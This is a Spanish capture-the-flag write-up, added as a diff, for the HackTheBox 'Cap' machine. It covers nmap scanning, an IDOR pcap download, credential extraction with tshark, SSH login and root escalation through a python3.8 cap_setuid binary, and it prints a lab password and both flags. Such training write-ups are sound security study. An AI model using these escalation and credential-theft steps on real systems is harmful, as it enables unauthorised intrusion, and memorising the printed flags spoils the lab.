@@ -1,0 +1,306 @@
+---------------
+[ CAP MACHINE ]
+---------------
+
+# Notas sobre la resolución de la máquina CAP por FeathersMcgr4w
+
+[GITHUB]: https://github.com/FeathersMcgr4w/
+
+[Lets Start!]
+
+-----
+| 1 | Ejecutamos un ping para verificar si esta activa la maquina victima --> ping -c 1 10.10.10.245
+-----
+
+└─$ ping -c 1 10.10.10.245
+PING 10.10.10.245 (10.10.10.245) 56(84) bytes of data.
+64 bytes from 10.10.10.245: icmp_seq=1 ttl=63 time=172 ms
+
+( TTL )
+El campo "ttl" (time to live) indica al cant. de saltos o routers que un paquete de datos puede atravezar antes de ser descartado.
+Cuando se envia un paquete por la red el valor TTL comienza con un número determinado dependiendo del SO al que se este enviando:
+64 -> Linux, 128 -> Windows, 255 --> Routers y Switches.
+Cada vez que el paquete pasa un router/salto, el TTL se reduce en 1. 
+Si el TTL llega a valor 0 antes de llegar a su destino, entonces se descarta el envio del paquete.
+
+> El "ttl=64" pertenece a maquina LINUX
+
+> El "ttl=128" pertenece a maquina WINDOWS
+
+Con esto ya sabemos a que sistema nos enfrentamos.
+
+
+Trace Route:
+
+└─$ ping -c 1 10.10.10.245 -R         
+PING 10.10.10.245 (10.10.10.245) 56(124) bytes of data.
+64 bytes from 10.10.10.245: icmp_seq=1 ttl=63 time=170 ms
+RR:     10.10.16.55
+        10.10.10.2 > nodo
+        10.10.10.245 > Maquina victima
+        10.10.10.245
+        10.10.16.1
+        10.10.16.55
+
+
+-----
+| 2 | Escaneo de Puertos con NMAP
+-----
+
+└─$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.245 -oG allPorts
+
+1. -p- : escanea todos los puertos (1 - 65535)
+
+2. -sS : escaneo SYN. En ves de realizar una conexión por TCP "-sT", se envia un paquete SYN para iniciar la conexión pero no la completa.
+		 Esto es más discreto y rápido ya que los firewalls no registran este tipo de conexiones incompletas.
+		 TCP 3-Way handshake (SYN - SYN-ACK - ACK). En este caso se envian solamente 2 handshakes (SYN - SYN-ACK)
+		 En este caso se deja la conexión abierta enviando un paquete Reset.
+		 
+		 
+3. --min-rate 5000 : indica a nmap enviar 5000 paquetes por segundo por la red.
+
+4. --open : terminado el escaneo nmap solo muestra los puertos abiertos. (no muestra ni cerrados ni filtrados)
+
+5. -vvv : modo vervoso al máximo. Muestra mucha más info del proceso de escaneo.
+
+6. -n : nmap desactiva la resolución DNS, esto aumenta la velosidad del escaneo.
+
+7. -Pn : Host discovery disabled, Indica que nmap no realize un "ping" previo para ver si el host esta activo.
+
+8. 10.10.10.245 : dirección IP objetivo
+
+9. -oG : exporta la captura
+
+
+Otro escaneo:
+
+└─$ nmap -p- --open -T5 -v -n 10.10.10.245 (Esto es un poco más lento)
+
+-T : tiempo del escaneo 0 - 5. (0 lento, 5 rápido)
+
+
+EJECUCION
+
+└─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.245 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 09:11 MST
+Initiating SYN Stealth Scan at 09:11
+Scanning 10.10.10.245 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.245
+Discovered open port 21/tcp on 10.10.10.245
+Discovered open port 22/tcp on 10.10.10.245
+Completed SYN Stealth Scan at 09:12, 14.83s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.245
+Host is up, received user-set (0.18s latency).
+Scanned at 2024-09-26 09:11:59 MST for 15s
+Not shown: 65448 closed tcp ports (reset), 84 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 63
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 14.96 seconds
+           Raw packets sent: 72239 (3.179MB) | Rcvd: 71342 (2.854MB)
+
+
+Con esto sabemos que los puertos: 21 - 22 - 80 estan abiertos.
+
+
+
+-----
+| 3 | Obtener información detallada con NMAP:
+-----
+
+└─# nmap -sCV -p21,22,80 10.10.10.245 -oN targeted
+
+1. -sCV : esta combinación incluye dos cosas
+	-sC : ejecuta los script de detección de info de servicios detallada de nmap (puertos abiertos, versiones, tecnologias, config) 
+		  Con el comando  podemos ver los algunos scripts que usara nmap : locate .nse | xargs grep "categories" --color | grep -oP '".*?"' | sort -u
+		  
+	-sV : identifica la versión exacta de los servicios corriendo (Apache 2xxx, Nginx Xxxx)
+
+2. -p21,22,80 : nmap solo acanea los puertos espacificados
+
+3. 10.10.10.245 : dirección IP objetivo
+
+4. -oN : indica a nmap que guarde el resultado en un archivo llamado "targeted" de salida normal (fasil lectura/texto plano)
+
+Con esto obtenemos información más detallada del sistema:
+
+-> Versiones de los servicios especificados
+-> Captura HTTP del sitio
+-> Cabezera HTTP
+-> Tecnologias
+
+-----
+| 4 | WHATWEB
+-----
+
+Realizamos whatweb 10.10.10.245 para obtener info de las tecnologias.
+
+
+
+-----
+| 5 | Probar credenciales por defecto para el servicio FTP:
+-----
+
+username y pass: anonymous (En este caso no funciona)
+
+
+
+-----
+| 6 | Entramos al aplicativo web y aprovechamos una vulnerabilidad de IDOR para descargar un archivo de otro usuario con logs no encritados.
+-----
+
+http://10.10.10.245/data/0
+
+
+
+-----
+| 7 | Analizamos la captura 0.pcap con tshark y obtenemos credenciales:
+-----
+
+tshark -r 0.pcap 2>/dev/null
+
+
+
+-----
+| 8 | Usamos las credenciales para loggearnos por ftp y por ssh
+-----
+user: nathan - pass: Buck3tH4TF0RM3!
+
+Servidor FTP
+Navegamos con comando "dir" (similar a ls)
+Descargamos archivo con "get"
+get user.txt
+
+
+
+-----
+| 9 |  Tanto en el servidor FTP como en el acceso por SSH, obtenemos un archivo "user.txt" con la flag -> 98f0a74c6bb940162bc0e5ad413bc9ba
+-----
+
+
+------
+| 10 | Ahora nos loggeamos por SSH con las credenciales de FTP y vamos a rootear.
+------
+
+
+------
+| 11 | Aqui encontraremos otro archivo "user.txt" con la misma flag del ftp. Pero eso no nos importa. Aqui es donde deberemos rootear.
+------
+
+1. Ejecutamos el comando : getcap -r / 2>/dev/null
+
+-> getcap : busca y lista archivos con capasidades/capabilities de seguridad en el sistema de archivos Linux.
+			Las "Capacidades" son permisos que se pueden asignar a archivos binarios para otorgarle privilegios sin necesidad de ser root o con el bit SUID.
+
+-> -r / : busqueda recursiva iniciando desde la raiz del sistema. Es decir busca en todos los directorios y sub-directorios.
+
+
+Encontramos esta ruta con la capability y el binario de Python:
+nathan@cap:~$ getcap -r / 2>/dev/null
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+
+
+Esto lo podemos aprovechar para elevar privilegios con el binario de Python.
+
+El informe contiene una entrada interesante para los archivos con capacidades. El /usr/bin/python3.8 se ha encontrado que tiene "cap_setuid" y "cap_net_bind_service", que no es la configuración predeterminada. De acuerdo con la documentación, CAP_SETUID permite que el proceso obtenga privilegios setuid sin el conjunto de bits SUID. Esto nos permite cambiar a UID 0, es decir, root. El desarrollador de Cap debe tener dada a Python esta capacidad para permitir que el sitio capture tráfico, lo que un usuario no root no puede hacer. **Explicación de SUID al final de todo**
+
+
+2. Ejecutamos PYTHON y modificamos permisos con libreria os:
+It calls os.setuid() which is used to modify the process user identifier (UID)
+
+
+nathan@cap:~$ /usr/bin/python3.8
+Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
+[GCC 9.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import os
+>>> os.setuid(0)
+>>> os.system("/bin/bash")
+
+root@cap:~# whoami
+root
+
+root@cap:~# id
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+
+
+
+------
+| 12 | FLAG: Navegamos al directorio /root
+------
+
+root@cap:~# ls /
+bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
+
+root@cap:~# cd /root
+
+root@cap:/root# ls
+root.txt  snap
+
+root@cap:/root# cat root.txt
+67901177669022538fb2d281772812e1
+
+
+
+- - - - - - - - - - - - - 
+| Estructura de permisos |
+- - - - - - - - - - - - -
+|
+|-> Root
+|
+|-> SUID
+|
+|-> Capabilities (CAP)
+
+
+-[ ROOT ] -> explicación
+
+El usuario root tiene permisos de superadministrador para las acciones de todo el sistema.
+
+
+
+-[ SUID ] -> explicación
+
+El bit SUID permite ejecutar binarios con permisos del administrador/root, sin ser administrador.
+Esto es posible por que previamente se configuro el binario con tal permiso.
+
+-rwsr-xr-x 1 root root 118168 Jul  7 06:30 /usr/bin/passwd
+
+La letra "s" representa el bit SUID.
+
+
+
+-[ CAPABILITIES ] -> explicación
+
+Las capabilities en Linux es dividir los permisos de root en conjunto de permisos particulares. Sin necesidad de ser root.
+
+Por ejemplo el binario del comando "ping" (/usr/bnin/ping) ejecuta la capability de "cap_net_raw+ep"
+
+Utilizar en comando 'getcap' para ver las capabilities de un binario:
+
+--$ getcap /usr/bin/ping
+--$ /usr/bin/ping = cap_net_raw+ep 
+
+Para este caso el comando "ping" tiene activada la capacidad "cap_net_raw" que permite enviar y recibir paquetes ICMP sin ser root.
+
+
+Ejemplo de capacidades en Linux:
+
+-> cap_setuid (permisos con operaciones relacionadas a gestión de usuarios)
+-> cap_net_bind_service (permite enlazar puertos privilegiados < 1024 (puertos conosidos))
+-> cap_sys_admin (otorga varios permisos de admin)
+-> cap_dac_override (ignorar permisos de acceso a archivos)
+-> cap_sys_time (modificar el reloj del sistema) 
+
+
+> CAP_SETUID 
+
+Puede ejecutar comandos como setuid(UID) para cambiar identidad de usuario por otro sonnecesidad de ser Root.
+
+getcap /ruta/al/archivo
+/ruta/al/archivo = cap_setuid+ep
